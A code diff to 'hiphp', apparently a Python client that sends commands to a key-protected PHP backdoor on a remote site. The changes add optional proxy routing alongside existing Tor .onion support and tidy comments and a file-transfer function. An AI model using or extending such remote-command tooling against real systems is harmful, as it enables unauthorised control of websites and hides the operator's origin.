@@ -32,10 +32,13 @@ from os.path import exists
 from biglibrary import *
 import base64
 
+#
 import os
+# if OS is Windows:
 if os.name == 'nt':
     os.system('color')
     #    import readline
+# if OS is Linux:
 else:
     try:
         import readline
@@ -45,7 +48,7 @@ else:
 #start hiphp class:
 class hiphp:
     #__init__:
-    def __init__(self,key,url,retu=False):
+    def __init__(self,key,url,retu=False,proxies=""):
         #
         self.key=tomd5(str(key))# Encrypt the 'key' with 'md5'.
         self.url=str(url)
@@ -76,6 +79,8 @@ class hiphp:
         self.sep=os.sep
 
         self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
+
+        self.proxies=proxies
 
     #cli:
     def cli(self):
@@ -147,6 +152,7 @@ class hiphp:
                 exit()
                 """
             else:
+                #hiphp.get_hole(self,get=True)
                 return reee
         else:
             getcwd=self.color.c(reee,self.c_green)
@@ -394,13 +400,16 @@ class hiphp:
     #do:
     def do(self,key,url,header,retu,command):
         regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
-        proxies = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
+        proxies_onion = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
         try:
             if regex.match(url):
                 #.onion
-                response=requests.post(url,headers=header,proxies=proxies)
+                response=requests.post(url,headers=header,proxies=proxies_onion)
             else:
-                response=requests.post(url,headers=header)
+                if self.proxies!="":
+                    response=requests.post(url,headers=header,proxies=self.proxies)
+                else:
+                    response=requests.post(url,headers=header)
             #response=requests.post(url,headers=header)
             #
             if response.status_code==200:
@@ -409,9 +418,12 @@ class hiphp:
                 if response.text[0:key_len]=="#"+key:
                     ploads={'command':self.cd+self.set+command}
                     if ".onion" in url:
-                        response=requests.post(url,headers=header,data=ploads,proxies=proxies)
+                        response=requests.post(url,headers=header,data=ploads,proxies=proxies_onion)
                     else:
-                        response=requests.post(url,headers=header,data=ploads)
+                        if self.proxies!="":
+                            response=requests.post(url,headers=header,data=ploads,proxies=self.proxies)
+                        else:
+                            response=requests.post(url,headers=header,data=ploads)
                     response_text=response.text[key_len:]
                     if retu==True:
                         return response_text
@@ -491,12 +503,8 @@ class hiphp:
 
     #download:
     def download(self,path_x,outpath=""):
-
-    
         new_command=file_to_b64(path_x)
-        
         path_x=os.path.basename(path_x)
-        
         if outpath=="":
             outpath=os.path.abspath(os.getcwd())
         
